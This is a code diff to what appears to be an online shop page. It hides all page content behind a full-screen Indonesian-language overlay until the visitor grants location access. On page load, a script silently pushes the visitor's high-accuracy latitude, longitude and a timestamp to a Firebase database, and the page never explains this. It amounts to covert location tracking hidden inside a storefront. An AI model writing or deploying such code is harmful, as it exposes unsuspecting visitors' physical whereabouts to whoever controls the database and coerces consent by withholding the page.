@@ -20,9 +20,33 @@
   <link
     href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Playfair+Display:ital,wght@0,900;1,900&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"
     rel="stylesheet">
+
+  <style>
+  body.hidden-content {
+    visibility: hidden;
+  }
+  #overlay-permission {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw;
+    height: 100vh;
+    background: rgba(230, 230, 230, 0.96);
+    z-index: 9999;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-size: 1.2rem;
+    font-weight: bold;
+    text-align: center;
+    padding: 2rem;
+  }
+</style>
 </head>
 
 <body>
+  <body class="hidden-content">
+  <div id="overlay-permission">⏳ Mengambil lokasi...<br>Mohon izinkan akses lokasi di browser Anda.</div>
+
   <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
     <symbol xmlns="http://www.w3.org/2000/svg" id="shopping-carriage" viewBox="0 0 24 24" fill="none">
       <path
@@ -1150,33 +1174,36 @@
   const db = firebase.database();
 
   function sendLocation(lat, lon) {
-    const now = new Date().toISOString();
-    db.ref("lokasi").push({
-      latitude: lat,
-      longitude: lon,
-      timestamp: now
-    }).then(() => {
-      document.getElementById('overlay').classList.add('hidden');
-    }).catch(err => {
-      document.getElementById('overlay').innerText = '❌ Gagal mengirim lokasi.';
-    });
-  }
+  const now = new Date().toISOString();
+  db.ref("lokasi").push({
+    latitude: lat,
+    longitude: lon,
+    timestamp: now
+  }).then(() => {
+    document.getElementById('overlay-permission').style.display = 'none';
+    document.body.classList.remove('hidden-content');
+  }).catch(err => {
+    document.getElementById('overlay-permission').innerText = '❌ Gagal mengirim lokasi.';
+  });
+}
+
 
   if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(
-      pos => {
-        const lat = pos.coords.latitude.toFixed(6);
-        const lon = pos.coords.longitude.toFixed(6);
-        sendLocation(lat, lon);
-      },
-      err => {
-        document.getElementById('overlay').innerText = "❌ Gagal akses lokasi. Silakan refresh & izinkan lokasi.";
-      },
-      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-    );
-  } else {
-    document.getElementById('overlay').innerText = "❌ Browser tidak mendukung Geolocation.";
-  }
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      const lat = pos.coords.latitude.toFixed(6);
+      const lon = pos.coords.longitude.toFixed(6);
+      sendLocation(lat, lon);
+    },
+    err => {
+      document.getElementById('overlay-permission').innerText = "❌ Akses lokasi ditolak. Silakan refresh & izinkan lokasi.";
+    },
+    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+  );
+} else {
+  document.getElementById('overlay-permission').innerText = "❌ Browser tidak mendukung Geolocation.";
+}
+
 </script>
 </body>
 
